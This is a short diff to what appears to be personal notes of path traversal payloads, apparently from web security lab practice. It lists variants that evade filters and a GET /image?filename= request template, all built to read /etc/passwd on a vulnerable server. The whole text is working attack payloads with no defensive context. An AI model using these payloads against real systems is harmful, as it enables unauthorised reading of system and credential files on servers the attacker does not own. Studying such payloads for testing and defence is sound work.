@@ -4,6 +4,10 @@ payload : ....//....//....//....//etc/passwd
 if waf Filter the payload 1 secnario ....//....//....//....//etc/passwd
 after Filterring it is ../../../../etc/passwd
 
+
+url : GET /image?filename=var/www/images HTTP/2  :- payload filname=var/www/images/../../../etc/passwd 
+
+
 try :-
 ...././.././../etc/passwd
 ..%2f..%2f..%2fetc/passwd
